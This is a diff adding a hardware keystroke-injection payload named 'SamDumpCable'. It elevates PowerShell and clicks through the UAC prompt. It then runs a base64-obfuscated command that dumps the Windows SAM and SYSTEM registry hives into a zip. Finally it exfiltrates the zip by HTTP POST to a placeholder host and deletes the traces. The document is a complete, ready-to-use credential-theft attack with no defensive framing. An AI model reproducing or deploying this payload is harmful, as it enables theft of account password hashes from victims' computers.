@@ -1,0 +1,16 @@
+## Title:         SamDumpCable
+## Description:   Dump users sam and system hive and exfiltrate them. Afterwards you can use a tool like samdump2, to get the users hashes.
+## Author:        0iphor13
+## Version:       1.0
+## Category:      Credentials
+
+Delay 1000
+RunWin powershell Start-Process powershell -Verb runAs
+Delay 3000
+PressRelease KEY_LEFT_ARROW
+Delay 1500
+PressRelease KEY_ENTER
+Delay 5000
+PrintLine powershell.exe -NoP -enc cgBlAGcAIABzAGEAdgBlACAAaABrAGwAbQBcAHMAYQBtACAAMQAzADMANwBPAE0ARwBzAGEAbQA7AHIAZQBnACAAcwBhAHYAZQAgAGgAawBsAG0AXABzAHkAcwB0AGUAbQAgADEAMwAzADcATwBNAEcAcwB5AHMAOwBDAG8AbQBwAHIAZQBzAHMALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAIgAkAFAAVwBEAFwAMQAzADMANwBPAE0ARwBzAHkAcwAiACwAIAAiACQAUABXAEQAXAAxADMAMwA3AE8ATQBHAHMAYQBtACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAATwBNAEcAZAB1AG0AcAAuAHoAaQBwADsAcgBlAG0AbwB2AGUALQBpAHQAZQBtACAAMQAzADMANwBPAE0ARwBzAHkAcwA7AHIAZQBtAG8AdgBlAC0AaQB0AGUAbQAgADEAMwAzADcATwBNAEcAcwBhAG0AOwBlAHgAaQB0AA==
+Delay 5000
+PrintLine iwr "http://0.0.0.0" -Method POST -InFile samdump.zip;Remove-Item samdump.zip;exit
